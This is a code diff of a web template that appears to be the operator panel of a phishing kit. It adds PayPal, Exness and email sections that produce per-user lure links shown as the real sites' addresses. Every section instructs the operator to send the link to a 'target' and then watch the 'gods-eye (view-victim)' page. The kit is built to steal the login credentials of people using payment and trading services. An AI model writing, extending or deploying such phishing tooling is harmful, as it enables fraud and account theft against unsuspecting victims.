@@ -1,18 +1,74 @@
 <div class="content-inner">
-    <div class="facebook">
 
+    <!-- THIS IS FOR PAYPAL -->
+    <div class="paypal">
         <div class="icon">
-            <i class="fa-brands fa-facebook"></i>
+            <i class="fa-brands fa-paypal"></i>
         </div>
-
         <!-- Copy URL Button -->
         <div class="url">
-            <button onclick="copyURL()"><i class="fa-solid fa-link"></i> Copy URL</button>
-            <a href="/facebook?userId=<%= userId %>">https//www.facebook.com</a>
+            <button onclick="copyURL('/paypal?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy PayPal URL
+            </button>
+            <a href="/paypal?userId=<%= userId %>">https://www.paypal.com</a>
         </div>
-
-        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits in check your
-            gods-eye(view-victim) </p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (view-victim).</p>
     </div>
 
+
+
+    <!-- THIS IS FOR EXNESS -->
+    <div class="exness">
+        <div class="icon">
+            <img src="/uploads/exness.png" alt="exness" width="40%" class="exness-img">
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/exness?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy Exness URL
+            </button>
+            <a href="/exness?userId=<%= userId %>">https://www.exness.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (view-victim).</p>
+    </div>
+
+
+
+    <!-- THIS IS FOR EMAIL -->
+    <div class="email">
+        <div class="icon">
+            <i class="fa-solid fa-envelope"></i>
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/email?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy Email URL
+            </button>
+            <a href="/email?userId=<%= userId %>">https://mail.example.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (view-victim).</p>
+    </div>
+
+
+
+
+
+
+
+
+
+
 </div>
+<script>
+    function copyURL(route) {
+        const url = window.location.origin + route; // Construct the full URL based on the route parameter
+        navigator.clipboard.writeText(url).then(() => {
+            alert('URL copied to clipboard!');
+        }).catch(err => {
+            console.error('Failed to copy URL:', err);
+        });
+    }
+</script>
